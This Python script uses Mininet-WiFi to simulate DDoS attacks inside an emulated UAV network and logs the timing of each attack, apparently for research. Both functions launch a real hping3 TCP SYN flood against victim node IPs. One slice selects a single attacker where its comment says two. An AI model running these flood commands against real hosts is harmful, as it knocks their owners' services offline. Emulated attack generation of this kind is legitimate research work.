#!/usr/bin/python
"""
ddos_hping3.py - 使用 hping3 模拟 UAV 网络中的 DDoS 攻击
"""

import random
import time
from mininet.net import Mininet
from mininet.node import Controller
from mininet.log import setLogLevel, info

"""
使用 hping3 发起 DDoS 攻击
attacker: 发起攻击的节点
victim_ip: 受害节点 IP
duration: 攻击持续时间（秒）
"""
def ddos_attack_target(net, target="sta5", duration=30, start_delay=5):
    """在随机两个攻击源节点上对目标节点发起 hping3 洪泛"""
    attackers = random.sample(net.stations[6:9], 2)  # UAV7~UAV9 里随机选两个
    victim = net.get(target)
    victim_ip = victim.IP()

    info(f"\n*** DDoS 攻击设置: 攻击者 {[a.name for a in attackers]} -> 目标 {target} ({victim_ip})\n")
    info(f"*** 攻击将在 {start_delay}s 后开始，持续 {duration}s\n")

    time.sleep(start_delay)

    for attacker in attackers:
    	# 发送 TCP SYN 洪泛，目标端口 80
        cmd = f"(hping3 -i u1000 -S -p 80 {victim_ip} & sleep {duration}; pkill -f 'hping3 -S -p 80 {victim_ip}')&"
        info(f"*** {attacker.name} 开始攻击 {victim.name}\n")
        #log:
        start_time = time.time()
        logput = f"DDoS 攻击开始，{start_time}: ---{attacker.name} 开始攻击 {victim.name}, 时长={duration}s---\n"
        logfile = f'/home/a/mininet-wifi/zy_attack_log/ddos_{start_time}.log'
        # 写入文件，追加'a' 覆盖使用'w'
        with open(logfile, 'a') as f:
        	f.write(logput)
        	attacker.cmd(cmd)
    #time.sleep(duration + 2)  # 等攻击结束
    info("\n*** DDoS 攻击返回\n")
    
    
def ddos_attack(net, attack_duration=30, total_duration=120, start_delay=5):
	"""
	依次对 net 中各节点发起 DDoS 攻击
	攻击者为最后两个节点，受害者在其他节点中循环选择
	attack_duration: 每次攻击时长
	total_duration: 总攻击时长
	start_delay: 攻击前等待
	"""
	attackers = net.stations[-2:-1]  # 最后两个节点
	all_targets = net.stations[:-2]  # 除攻击者外的所有节点
	
	info(f"\n*** DDoS 攻击将在 {start_delay}s 后开始\n")
	time.sleep(start_delay)
	
	start_time = time.time()
	elapsed = 0    
	logfile = f'/home/a/mininet-wifi/zy_attack_log/ddos_{int(start_time)}.log'
	while elapsed < total_duration:
		# 随机选择一个目标
		victim = random.choice(all_targets)
		victim_ip = victim.IP()
		info(f"\n*** 攻击者 {[a.name for a in attackers]} -> 目标 {victim.name} ({victim_ip})\n")
		info(f"*** 攻击时长 {attack_duration}s\n")
		logput = f"\n*** 攻击者 {[a.name for a in attackers]} -> 目标 {victim.name} ({victim_ip}) 时长={attack_duration}s\n"
		with open(logfile, 'a') as f:
			f.write(logput)
        # 启动攻击命令
		for attacker in attackers:
			cmd = f"(hping3 -i u1000 -S -p 80 {victim_ip} & sleep {attack_duration}; pkill -f 'hping3 -S -p 80 {victim_ip}')&"
			info(f"*** {attacker.name} 开始攻击 {victim.name}\n")
			# 写日志
			log_time = time.time()
			logput = f"开始，{log_time}: {attacker.name} -> {victim.name}\n"
			with open(logfile, 'a') as f:
				f.write(logput)
			attacker.cmd(cmd)
		# 等待攻击结束
		time.sleep(attack_duration)
		# 更新已用总时长
		elapsed = time.time() - start_time
	info("\n*** DDoS 攻击总时长已达上限，攻击结束\n")


